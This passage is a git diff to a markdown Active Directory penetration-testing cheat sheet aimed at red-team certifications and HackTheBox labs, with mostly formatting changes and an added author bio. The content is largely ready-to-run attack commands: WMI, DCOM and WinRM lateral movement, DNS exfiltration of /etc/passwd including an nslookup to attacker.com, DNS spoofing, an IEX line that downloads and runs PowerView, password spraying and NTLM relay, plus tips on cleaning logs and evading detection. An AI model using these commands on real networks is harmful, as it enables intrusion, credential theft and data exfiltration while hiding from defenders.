 # Linux - impacket
 wmiexec.py domain.com/user:pass@target
@@ -892,7 +987,8 @@ wmic /node:target /user:domain\user /password:pass process call create "cmd.exe 
 Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c <command>"
 ```
 
-#### **DCOM Lateral Movement**
+#### DCOM Lateral Movement
+
 ```bash
 # Linux
 dcomexec.py domain.com/user:pass@target
@@ -903,7 +999,8 @@ $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Appli
 $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c <command>", "7")
 ```
 
-#### **WinRM Lateral Movement**
+#### WinRM Lateral Movement
+
 ```bash
 # Linux
 evil-winrm -i target -u user -p password
@@ -914,9 +1011,10 @@ Enter-PSSession -ComputerName target -Credential $cred
 Invoke-Command -ComputerName target -Credential $cred -ScriptBlock {<command>}
 ```
 
-### **🌐 DNS Attacks**
+### 🌐 DNS Attacks
 
-#### **DNS Exfiltration**
+#### DNS Exfiltration
+
 ```bash
 # DNSExfiltrator
 python3 dnsexfiltrator.py -d domain.com -f /etc/passwd
@@ -925,7 +1023,8 @@ python3 dnsexfiltrator.py -d domain.com -f /etc/passwd
 nslookup $(echo "data" | base64).attacker.com
 ```
 
-#### **DNS Poisoning**
+#### DNS Poisoning
+
 ```bash
 # Responder DNS spoofing
 responder -I eth0 -A
@@ -936,9 +1035,10 @@ dnschef --fakeip=attacker_ip --fakedomains=*.domain.com
 
 ---
 
-## 🔧 **Essential Tool Installation & Setup**
+## 🔧 Essential Tool Installation & Setup
 
-### **🐧 Advanced Linux Setup**
+### 🐧 Advanced Linux Setup
+
 ```bash
 # Core Tools
 pip3 install impacket crackmapexec ldap3 dnspython requests
@@ -965,7 +1065,8 @@ git clone https://github.com/SecureAuthCorp/impacket.git
 pip3 install pycryptodome pyasn1 ldap3
 ```
 
-### **🪟 Advanced Windows Setup**
+### 🪟 Advanced Windows Setup
+
 ```powershell
 # PowerShell Modules
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
@@ -982,7 +1083,8 @@ Import-Module GroupPolicy
 Install-Module ADRecon
 ```
 
-### **🐳 Docker Environments**
+### 🐳 Docker Environments
+
 ```bash
 # BloodHound
 docker run -p 7474:7474 -p 7687:7687 neo4j:latest
@@ -996,50 +1098,56 @@ docker-compose up -d goad # Game of Active Directory
 
 ---
 
-## 🎯 **Advanced Methodology & Tips**
+## 🎯 Advanced Methodology & Tips
 
-### **🔍 Systematic Enumeration Approach**
-1. **Network Discovery**: `nmap`, `crackmapexec smb`, port scanning
-2. **Domain Enumeration**: `BloodHound`, `PowerView`, LDAP queries
+### 🔍 Systematic Enumeration Approach
+
+1. **Network Discovery**: nmap, crackmapexec smb, port scanning
+2. **Domain Enumeration**: BloodHound, PowerView, LDAP queries
 3. **Credential Hunting**: Kerberoasting, ASREPRoasting, password spraying
-4. **Certificate Analysis**: `certipy find`, template enumeration
+4. **Certificate Analysis**: certipy find, template enumeration
 5. **Trust Relationships**: Domain trusts, forest trusts, external trusts
 6. **Service Analysis**: Exchange, SCCM, SQL servers, web applications
 7. **Misconfigurations**: Unconstrained delegation, dangerous permissions
 
-### **🏆 Certification-Specific Strategies**
+### 🏆 Certification-Specific Strategies
 
-#### **🎯 CRTP (Certified Red Team Professional)**
+#### 🎯 CRTP (Certified Red Team Professional)
+
 - Focus on PowerShell and .NET techniques
 - Master BloodHound for attack path discovery
 - Practice constrained delegation exploitation
 - Understand forest-level attacks and cross-domain scenarios
 - SQL server links are common privilege escalation vectors
 
-#### **🎯 CRTE (Certified Red Team Expert)**
+#### 🎯 CRTE (Certified Red Team Expert)
+
 - Advanced persistence techniques (WMI, scheduled tasks)
 - Certificate template abuse and ADCS attacks
 - Cross-forest attacks and enterprise admin escalation
 - Advanced evasion techniques and AMSI bypasses
 - Complex multi-hop scenarios with various trust types
 
-#### **🎯 CRTM (Certified Red Team Master)**
+#### 🎯 CRTM (Certified Red Team Master)
+
 - Zero-day research and exploit development
 - Advanced coercion and relay attack chains
 - Complex enterprise environments with multiple forests
 - Custom tooling development and automation
 - Advanced threat hunting evasion
 
-### **🎪 HackTheBox Pro Tips**
+### 🎪 HackTheBox Pro Tips
 
-#### **🔥 Common Patterns**
+#### 🔥 Common Patterns
+
 - **Web Apps**: Look for LDAP injection, password in source code
 - **File Shares**: Always check SYSVOL for GPP passwords
 - **Certificates**: Check for vulnerable templates and relay opportunities
 - **Services**: SQL servers often have domain admin privileges
 - **Backups**: Look for password backup solutions and historical data
 
-#### **🚀 Speed Optimization**
+#### 🚀 Speed Optimization
+
 ```bash
 # Quick Domain Survey
 crackmapexec smb $TARGETS --gen-relay-list relay_targets.txt
@@ -1047,22 +1155,25 @@ crackmapexec ldap $DC -u '' -p '' --users --groups
 bloodhound-python -c All -u guest -p '' -d domain.com -ns $DC
 ```
 
-#### **🎭 Stealth Considerations**
-- Use `--stealth` flags when available
+#### 🎭 Stealth Considerations
+
+- Use --stealth flags when available
 - Rotate source IPs and user agents
 - Time delays between attacks
 - Clean up artifacts and logs
 - Use legitimate tools when possible (PowerShell, WMI)
 
-### **📚 Advanced Learning Resources**
+### 📚 Advanced Learning Resources
 
-#### **🔬 Practice Labs**
+#### 🔬 Practice Labs
+
 - **GOAD (Game of Active Directory)**: Complex multi-forest lab
 - **VulnLab**: Advanced AD scenarios
 - **HackTheBox Pro Labs**: Dante, RastaLabs, Offshore
 - **TryHackMe**: Holo, Wreath networks
 
-#### **🛠️ Custom Tooling**
+#### 🛠️ Custom Tooling
+
 ```bash
 # Build custom wordlists
 cewl https://company.com > custom_wordlist.txt
@@ -1072,7 +1183,7 @@ hashcat --stdout -r best64.rule custom_wordlist.txt > enhanced_wordlist.txt
 for target in $(cat targets.txt); do crackmapexec smb $target -u users.txt -p passwords.txt; done
 ```
 
-### **🔥 Pro Tips for Advanced Practitioners**
+### 🔥 Pro Tips for Advanced Practitioners
 
 1. **Always enumerate certificates first** - ADCS misconfigurations are common and powerful
 2. **Coercion attacks are goldmines** - PetitPotam, PrinterBug, Coercer for forced authentication
@@ -1085,7 +1196,7 @@ for target in $(cat targets.txt); do crackmapexec smb $target -u users.txt -p pa
 9. **DNS is often overlooked** - DNS admin privileges can lead to domain admin
 10. **Event logs tell stories** - Understand what you're generating for better evasion
 
-### **⚡ Quick Reference Commands**
+### ⚡ Quick Reference Commands
 
 ```bash
 # One-liner domain takeover check
@@ -1101,9 +1212,19 @@ responder -I eth0 -A & ntlmrelayx.py -tf targets.txt -smb2support
 sharphound.exe -c All --stealth --zipfilename $(hostname)_$(date +%Y%m%d).zip
 ```
 
-**Author**: Mrx0rd
+---
+
+## About Me
+
+**Mrx0rd**  
+*Cybersecurity Researcher & Active Directory Specialist*
+
+Passionate about Active Directory security research, advanced penetration testing methodologies, and red team operations. Constantly exploring new attack vectors and sharing knowledge with the cybersecurity community through comprehensive guides and practical research.
+
+Always learning, always hacking, always improving the art of ethical penetration testing.
 
 ---
 
 *"In Active Directory, there are no coincidences, only misconfigurations waiting to be discovered."*
 
+#ActiveDirectory #PenetrationTesting #RedTeam #Cybersecurity #InfoSec #Hacking #CRTP #CRTE #CRTM #HackTheBox #Kerberos #ADCS #PowerShell #Impacket #BloodHound #Mimikatz #CyberSec #EthicalHacking #SecurityResearch #ADAttacks
